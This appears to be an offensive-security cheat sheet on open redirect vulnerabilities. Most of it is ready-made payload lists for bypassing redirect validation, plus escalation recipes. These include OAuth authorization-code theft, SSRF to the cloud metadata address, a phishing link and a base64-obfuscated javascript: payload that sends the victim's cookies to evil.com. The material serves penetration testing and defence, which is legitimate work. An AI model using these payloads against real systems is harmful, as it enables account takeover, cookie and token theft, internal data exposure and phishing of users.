---
tags:
  - medium
  - client-side
---

# Open Redirect

Redirect users to external domains via a controlled parameter. Alone it's low severity, but when chained with OAuth or SSRF, it becomes critical.

## TL;DR

```bash
# Basic payloads
?redirect=https://evil.com
?next=//evil.com
?url=https://trusted.com@evil.com

# OAuth token theft
redirect_uri=https://trusted.com/redirect?url=https://evil.com

# SSRF chain
POST /fetch {"url": "https://trusted.com/redirect?url=http://169.254.169.254/"}
```

## How It Works

Open redirects occur when an application takes user input to determine redirect destination without proper validation:

1. **User clicks trusted link** - `https://trusted.com/redirect?url=...`
2. **Application redirects** - Server sends 302/301 to user-controlled URL
3. **Browser follows** - User ends up on attacker domain

**Why it's dangerous:**

- **OAuth Token Theft** - Redirect authorization codes to attacker
- **SSRF Chaining** - Internal fetchers follow redirects to internal resources
- **Phishing** - Legitimate domain in URL bar tricks users
- **Filter Bypasses** - Redirect through trusted domain to reach blocked site

## Detection

### Common Parameter Names

```
redirect, redirect_url, redirect_uri
next, next_url, nextUrl
return, return_url, returnUrl, return_to
url, uri, link, goto
continue, continueTo
target, dest, destination
redir, rurl, r, u
callback, callback_url
forward, forward_url
out, checkout_url
image_url, login_url
post_logout_redirect_uri
```

### Signals

**Direct Value Testing:**
```bash
# Test each parameter with external URL
curl -i "https://target.com/redirect?url=https://evil.com"

# Look for 3xx response
HTTP/1.1 302 Found
Location: https://evil.com
```

**In OAuth Flows:**
```bash
# OAuth endpoints often have redirect parameters
https://target.com/oauth/authorize?redirect_uri=https://callback.com

# Test with external domain
redirect_uri=https://evil.com
```

**In Logout Flows:**
```bash
# Post-logout redirects often less protected
https://target.com/logout?return_to=https://evil.com
```

## Exploitation

### Basic Payloads

```bash
# Standard
?redirect=https://evil.com

# Protocol-relative
?url=//evil.com
?url=///evil.com
?url=////evil.com

# Backslash tricks (browser vs server parsing)
?url=https://trusted.com\@evil.com
?url=//trusted.com\evil.com

# Userinfo abuse
?url=https://trusted.com@evil.com
?url=https://evil.com#@trusted.com

# Path-based
/redirect/https://evil.com
```

### Encoding Bypasses

```bash
# Double encoding
?url=%252f%252fevil.com

# URL encoding
?url=https%3A%2F%2Fevil.com

# Mixed case
?url=hTtPs://eViL.com
?url=HTTPS://EVIL.COM

# Null byte (legacy systems)
?url=https://trusted.com%00.evil.com

# CRLF injection
?url=https://trusted.com%0d%0aLocation:%20https://evil.com
```

### Parser Differentials

```bash
# URL with @ (userinfo section)
?url=https://trusted.com:443@evil.com
?url=https://trusted.com%2540evil.com

# Fragment confusion
?url=https://evil.com#@trusted.com
?url=https://trusted.com#.evil.com

# Query confusion  
?url=https://trusted.com?.evil.com

# Subdomain confusion
?url=https://trusted.com.evil.com

# Multiple slashes
?url=https:/\/\evil.com
?url=https:\/\/evil.com
```

### IP Address Variants

```bash
# Decimal IP (127.0.0.1 = 2130706433)
?url=http://2130706433

# Hex IP
?url=http://0x7f000001
?url=http://0x7f.0x00.0x00.0x01

# Octal
?url=http://0177.0.0.1

# IPv6
?url=http://[::1]
?url=http://[::ffff:127.0.0.1]
?url=http://[::]

# Shortened IPv6
?url=http://[::ffff:7f00:1]
```

### Unicode & IDNA

```bash
# Homoglyphs (Cyrillic 'о' vs Latin 'o')
?url=https://gооgle.com

# Punycode encoding
?url=https://xn--ggle-0nda.com

# Fullwidth characters
?url=https://evil。com

# Mixed scripts
?url=https://ɢoogle.com
```

### Whitespace & Control Characters

```bash
# Tab character
?url=https://evil.com%09

# Newline
?url=https://evil.com%0a
?url=https://evil.com%0d

# Leading space
?url=%20https://evil.com

# Null byte
?url=https://evil.com%00

# Vertical tab
?url=https://evil.com%0b
```

## Bypasses

### Domain Validation Bypass

```bash
# If checking for "trusted.com" in URL:
?url=https://evil.com/trusted.com
?url=https://evil.com?trusted.com
?url=https://evil.com#trusted.com
?url=https://trusted.com@evil.com
?url=https://evil.com/redirect?url=trusted.com
```

### Whitelist Bypass

```bash
# If only allowing specific domain:
# Use subdomain takeover
?url=https://vulnerable-subdomain.trusted.com
# (if you control that subdomain)

# Use open redirect on trusted domain
?url=https://trusted.com/redirect?url=https://evil.com

# Use data URI
?url=data:text/html,<script>location='https://evil.com'</script>

# Use JavaScript URI
?url=javascript:window.location='https://evil.com'
```

### Multi-Hop Redirects

```bash
# First redirect validated, second not
?url=https://trusted.com/redirect?url=https://also-trusted.com/redirect?url=https://evil.com

# Chain through multiple trusted domains
?url=https://trusted1.com/r?url=https://trusted2.com/r?url=https://evil.com
```

### Case Sensitivity

```bash
# Mixed case domain validation
# If checking for "trusted.com":
?url=https://TRUSTED.COM@evil.com
?url=https://Trusted.Com
```

## Escalation

### OAuth Token Theft

```bash
# Standard OAuth flow
https://oauth-provider.com/authorize?
  client_id=123&
  redirect_uri=https://trusted.com/callback&
  response_type=code

# Trusted.com has open redirect at /redirect?url=
# Exploit:
redirect_uri=https://trusted.com/redirect?url=https://evil.com

# Flow:
# 1. User authorizes app
# 2. OAuth provider redirects to trusted.com/redirect?url=evil.com&code=AUTH_CODE
# 3. Trusted.com redirects to evil.com?code=AUTH_CODE
# 4. Attacker captures authorization code
```

### SSRF via Open Redirect

```bash
# Server-side request with URL validation
POST /fetch-preview HTTP/1.1
Content-Type: application/json

{"url": "https://trusted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/"}

# Server validates allowed domain (trusted-domain.com)
# Follows redirect to AWS metadata endpoint
# Returns internal data to attacker
```

### Cookie Theft via Subdomain Redirect

```bash
# If cookies are set on *.target.com
# Redirect to attacker-controlled subdomain
?url=https://attacker.target.com

# Or subdomain takeover
?url=https://dangling-cname.target.com
```

### XSS via JavaScript URI

```bash
# If application doesn't filter javascript: protocol
?url=javascript:alert(document.domain)
?url=javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))

# data: URI
?url=data:text/html,<script>alert(document.domain)</script>
```

### Phishing Chain

```html
<!-- Email with trusted domain visible -->
<a href="https://accounts.google.com/redirect?url=https://evil-login-page.com">
  Reset your password
</a>

<!-- Victim sees google.com in URL, trusts it -->
<!-- Clicks, gets redirected to attacker's phishing page -->
```

## Pro Tips

- **OAuth First** - Maximum impact in OAuth flows (authorization code theft)
- **post_logout_redirect_uri** - Often less protected than redirect_uri
- **Multi-Hop Chains** - First hop validated, subsequent hops not checked
- **Parser Differentials** - Test how server vs browser canonicalize URLs
- **SSRF Testing** - Internal fetchers often follow redirects blindly
- **Whitelist != Blacklist** - Easier to bypass domain whitelists than blacklists
- **Check All Parameters** - Don't stop at `redirect`, test all navigation parameters
- **Mobile Apps** - Often have open redirects in deep link handlers
- **JavaScript Redirects** - Check client-side redirects (`window.location`)
- **Meta Refresh** - Look for `<meta http-equiv="refresh">` with user input

## References

- [PortSwigger: Open Redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [OWASP: Unvalidated Redirects and Forwards](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [HackerOne: Open Redirect Reports](https://hackerone.com/hacktivity?querystring=open%20redirect)
